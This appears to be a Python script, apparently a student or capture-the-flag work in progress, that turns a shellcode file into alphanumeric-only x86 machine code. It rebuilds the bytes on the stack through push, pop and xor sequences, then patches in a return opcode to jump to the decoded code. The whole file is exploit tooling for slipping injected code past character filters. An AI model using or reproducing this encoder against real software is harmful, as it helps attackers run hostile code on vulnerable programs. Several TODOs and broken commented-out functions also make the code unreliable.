#open("name", "rb")
# C3 = return
# push ect ret
# gdp examine -24i

# xor <r/m8> <r8> 

#04F = xor [esi + 2*eax] dh
# dh is 8 bit esi. maybe change dh to different register. or use at beginning and use ecx instead of esi
# push whatever will xor with [esi+2*eax] to get return opcode (c3), pop it to dh, run the above xor, 
# push esp to stack, and then return will run.

# f before h for override
import sys
import itertools as it

# registers
#define EAX 0
#define EBX 3
#define ECX 1
#define EDX 2
#define ESI 6
#define EDI 7
#define ESP 4
#define EBP 5

#aplha_ints = [30, 31, 32, 33, 34, 35, 36, 37, 38, 39, ]

alpha_code = []

def main():
	if len(sys.argv) - 1 != 1:
		print("Wrong number of arguments")

	copy_ecx_to_esi()
	eax_ff()

	with open(sys.argv[1], "rb") as f:
		all_bytes = bytes(f.read())
		#byte = b'\x6a'
		#print("a" + byte.decode("ascii"))
		#print(all_bytes.hex())
		#print(~bytes([128])[0] & 255)

		for i in reversed(all_bytes):
			#print(alpha_check(i))
			'''if i == 0:
				cat_00()
			elif i == 255:
				cat_ff()'''
			if alpha_check(i):
				cat_alpha(bytes([i]))
			elif i < 128:
				cat_xor(i)
			else:
				cat_not(i)

		copy_esi_to_edx() # copy esi to edx
		alpha_code.append("h")# get dh (8bit esi) to Y1 that xors with offset below to = c3
		cat_not(b'\xf3'[0]) # '0' xor 0xf3 = 0xc3
		cat_alpha(b'\x30')
		cat_alpha(b'\x30')
		cat_alpha(b'\x30')
		alpha_code.append("Y") #pop ecx
		copy_ecx_to_esi() # esi now has what will xor with '0' to make c3

		#copy_esi_to_edi() # copy esi to edi address of top of code to edi
		size = len(alpha_code) # get eax = length of byte string plus code before the comming c3 / 2
		size = size + 3 + 70 + 24 + 1 + 9 + 1# size + xor length + longest to push size to stack + 2*cat_xor(b'\x00'[0]) + pop eax + copy_edx_to_edi() size + push esp

		#the following section pushes each byte of int size to the stack
		
		binary = bin(size // 2)
		if size % 2:
			binary = bin((size + 1) // 2)
		binary = binary[2:]
		print(binary)

		end = len(binary) - 1 #first byte
		start = end - 8 + 1
		binary_byte = bytes([int(binary[start : end+1], 2)])
		print(binary_byte)
		if alpha_check(binary_byte[0]):
			# add 33 bytes of padding
			for i in range(0, 33):
				alpha_code.append("A")
			cat_alpha(binary_byte[0])
		elif binary_byte[0] < 128:
			#add 23 bytes of padding
			for i in range(0, 23):
				alpha_code.append("A")
			cat_xor(binary_byte[0])
		else:
			cat_not(binary_byte[0]) # 35 bytes long

		end = len(binary) - 9 #second byte
		start = end - 8 + 1
		padded_binary = binary[start : end+1]
		for i in range(len(binary[start : end+1]), 8):
			padded_binary = "0" + padded_binary
		#print(padded_binary)
		binary_byte = bytes([int(padded_binary, 2)])
		print(binary_byte)
		if alpha_check(binary_byte[0]):
			# add 33 bytes of padding
			for i in range(0, 33):
				alpha_code.append("A")
			cat_alpha(binary_byte[0])
		elif binary_byte[0] < 128:
			# add 23 bytes of padding
			for i in range(0, 23):
				alpha_code.append("A")
			cat_xor(binary_byte[0])
		else:
			cat_not(binary_byte[0]) # 35 bytes long

		cat_xor(b'\x00'[0])
		cat_xor(b'\x00'[0])

		copy_edx_to_edi() #edi now has beginning of shellcode

		if size % 2:
			alpha_code.append("A") # if size is odd, add this padding
		alpha_code.append("X") # pop eax TODO: gdb shows eax has 0x30303030 now, why?

		alpha_code.append("0") # xor [edi + 2*eax] dh
		alpha_code.append("4")
		alpha_code.append("G")

		alpha_code.append("T") # push esp

		alpha_code.append("0") # this is alphanumeric X1 that xors with Y1 to equal c3

		for i in alpha_code:
			print(i, end = '')

'''def cat_00():
	alpha_code.append("h") # push aaaa to stack
	to_add = "aaaa"
	alph__code.append(to_add)
	alpha_code.append("X") # pop aaaa to eax

	alpha_code.append("5") # xor eax with aaaa to get 00000000
	to add = "aaaa"
	alpha_code.append(to_add)

	alpha_code.append("P") # push eax
	alpha_code.append("DDD") # inc esp. get rid of 3 of 4 00 bytes

	alpha_code.append("H") # dec eax to get back to ffffffff'''

'''def cat_ff():
	alpha_code.append("h") # push aaaa to stack
	to_add = "aaaa"
	alph__code.append(to_add)
	alpha_code.append("X") # pop aaaa to eax

	alpha_code.append("5") # xor eax with aaaa to get 00000000
	to add = "aaaa"
	alpha_code.append(to_add)
	alpha_code.append("H") # dec eax to get to ffffffff

	alpha_code.append("P") # push eax
	alpha_code.append("DDD") # inc esp. get rid of 3 of 4 ff bytes'''

def cat_alpha(byte):
	alpha_code.append("j") # push is this the right code? could it also be "h", 68? j is byte, h is double

	#to_add = "a" + byte.decode("ascii")
	alpha_code.append(byte.decode("ascii")) # byte to push + ??

	#alpha_code.append("D") # inc esp

def cat_xor(byte):
	byte_list = alpha_xor(byte)

	alpha_code.append("h") # push <imm32>
	to_add = "aaa" + bytes([byte_list[0]]).decode("ascii")
	for i in to_add:
		alpha_code.append(i)

	alpha_code.append("X") # pop X1aaa to eax
	
	alpha_code.append("5") # xor eax with Y1aaa to get B1000000
	to_xor = "aaa" + bytes([byte_list[1]]).decode("ascii")
	for i in to_xor:
		alpha_code.append(i)

	#alpha_code.append("4") # xor al with Y1 to get B1
	#alpha_code.append(bytes([byte_list[1]]).decode("ascii"))

	alpha_code.append("P") # push eax
	for i in range(0, 3):
		alpha_code.append("D") # inc esp. get rid of 3 of 4 00 bytes

#TODO: why would you need an alpha_not?
def cat_not(byte):
	cat_xor(~bytes([byte])[0] & 255) # is this right?

	alpha_code.append("T") # push %esp, 54
	alpha_code.append("Y") # pop %ecx, 59

	eax_ff()
	copy_eax_to_edi()
	# xor [ecx],<r8> r8 is a register with ff
	alpha_code.append("0") # xor [ecx] bh (%edi)
	alpha_code.append("9")

def eax_ff():
	# pop aaaa into eax
	alpha_code.append("h") # push aaaa to stack
	to_add = "aaaa"
	for i in to_add:
		alpha_code.append(i)
	alpha_code.append("X") # pop aaaa to eax
	#ecx
	alpha_code.append("5") # xor eax with aaaa to get 00000000
	to_add = "aaaa"
	for i in to_add:
		alpha_code.append(i)
	alpha_code.append("H") # dec eax to get ffffffff

# used for category_NOT
def copy_eax_to_edi():
	alpha_code.append("P") # push eax ecx edx ebx eax ebp esi eax
	alpha_code.append("Q")
	alpha_code.append("R")
	alpha_code.append("S")
	alpha_code.append("P")
	alpha_code.append("U")
	alpha_code.append("V")
	alpha_code.append("P")
	alpha_code.append("a") #popad

# used at start of code to save start address for later
def copy_ecx_to_esi():
	alpha_code.append("P")
	alpha_code.append("Q")
	alpha_code.append("R")
	alpha_code.append("S")
	alpha_code.append("P")
	alpha_code.append("U")
	alpha_code.append("Q")
	alpha_code.append("W")
	alpha_code.append("a")

# used at end of code to get start address in edx
def copy_esi_to_edx():
	alpha_code.append("P")
	alpha_code.append("Q")
	alpha_code.append("V")
	alpha_code.append("S")
	alpha_code.append("P")
	alpha_code.append("U")
	alpha_code.append("V")
	alpha_code.append("W")
	alpha_code.append("a")

def copy_edx_to_edi():
	alpha_code.append("P")
	alpha_code.append("Q")
	alpha_code.append("R")
	alpha_code.append("S")
	alpha_code.append("P")
	alpha_code.append("U")
	alpha_code.append("V")
	alpha_code.append("R")
	alpha_code.append("a")

def alpha_check(byte):
	if byte < ord('0'):
		return False
	elif byte <= ord('9'):
		return True
	elif byte < ord('A'):
		return False
	elif byte <= ord('Z'):
		return True
	elif byte < ord('a'):
		return False
	elif byte <= ord('z'):
		return True
	else:
		return False

def alpha_xor(byte):
	for i in it.chain(range(48, 58), range(65, 91), range(97, 123)):
		for j in it.chain(range(i, 58), range(max(i, 65), 91), range(max(i, 97), 123)):
			if i ^ j == byte:
				return [i, j]

if __name__ == "__main__":
	main()